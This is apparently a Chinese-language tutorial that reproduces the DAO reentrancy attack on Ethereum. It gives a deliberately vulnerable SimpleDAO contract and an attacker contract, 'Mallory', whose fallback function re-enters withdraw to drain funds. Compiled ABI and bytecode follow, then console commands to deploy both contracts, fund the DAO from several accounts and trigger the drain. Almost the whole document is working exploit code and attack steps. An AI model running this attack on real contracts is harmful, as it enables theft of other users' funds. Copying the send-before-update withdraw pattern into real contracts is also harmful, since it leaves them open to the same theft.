# 准备合约
```
pragma solidity ^0.4.2;

contract SimpleDAO {   
  mapping (address => uint) public credit;
    
  function donate() payable {
    credit[msg.sender] += msg.value;
  }
    
  function withdraw(uint amount) {
    if (credit[msg.sender]>= amount) {
      bool res = msg.sender.call.value(amount)();
      credit[msg.sender]-=amount;
    }
  }  

  function queryCredit(address to) view returns (uint){
    return credit[to];
  }
}

contract Mallory {
  SimpleDAO public dao;
  address owner;

  function Mallory(SimpleDAO addr){ 
    owner = msg.sender;
    dao = addr;
  }
  
  function getJackpot() { 
    bool res = owner.send(this.balance); 
  }

  function() payable { 
    dao.withdraw(dao.queryCredit(this)); 
  }
}
```

便于复制的abi和bytecode：
```
daoabi=JSON.parse('[{\"constant\":false,\"inputs\":[{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"to\",\"type\":\"address\"}],\"name\":\"queryCredit\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"credit\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"donate\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"}]')

daocode='0x608060405234801561001057600080fd5b506102ee806100206000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680632e1a7d4d1461006757806359f1286d14610094578063d5d44d80146100eb578063ed88c68e14610142575b600080fd5b34801561007357600080fd5b506100926004803603810190808035906020019092919050505061014c565b005b3480156100a057600080fd5b506100d5600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610214565b6040518082815260200191505060405180910390f35b3480156100f757600080fd5b5061012c600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061025c565b6040518082815260200191505060405180910390f35b61014a610274565b005b6000816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515610210573373ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185875af1925050509050816000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b5050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60006020528060005260406000206000915090505481565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505600a165627a7a723058209b4dd0a665cf8c5057067c822ae99c8b785d52f8ef84e06ef75d410ae59e27270029'

malabi=JSON.parse('[{\"constant\":true,\"inputs\":[],\"name\":\"dao\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"getJackpot\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"addr\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]')

malcode='0x608060405234801561001057600080fd5b506040516020806103e48339810180604052810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610320806100c46000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680634162169f146101ec5780639329066c14610243575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166359f1286d306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050602060405180830381600087803b15801561014557600080fd5b505af1158015610159573d6000803e3d6000fd5b505050506040513d602081101561016f57600080fd5b81019080805190602001909291905050506040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b1580156101d257600080fd5b505af11580156101e6573d6000803e3d6000fd5b50505050005b3480156101f857600080fd5b5061020161025a565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561024f57600080fd5b5061025861027f565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050509050505600a165627a7a72305820a67484df2a9f06083ef7a8861e73b9810a00e073accc2154aa25f27737497c560029'
```

# 将合约装载到链上
首先部署simpleDAO, 比如我这里得到的合约实例地址为0x5F3e0Cc753B825d83AFBBcFB4fbF966A6BAf7990。

然后在部署Mallory合约的时候，以上面的合约地址为参数，例如，mal为合约，malins为合约实例，则：
`malins=mal.new('0x5F3e0Cc753B825d83AFBBcFB4fbF966A6BAf7990',{data:bytecode, from:eth.coinbase, gas:10000000})`

# 给simpleDAO充值
`daoins.donate.sendTransaction({from:eth.coinbase,value:web3.toWei(3,'ether')})`
找多几个账号充值，以拿取别人的金额。

# 发动攻击
先设置defaultAccount，不然在调用的时候会显示invalid address。然后就可以发动攻击。
```
eth.defaultAccount=eth.coinbase
malins.getJackpot()
```



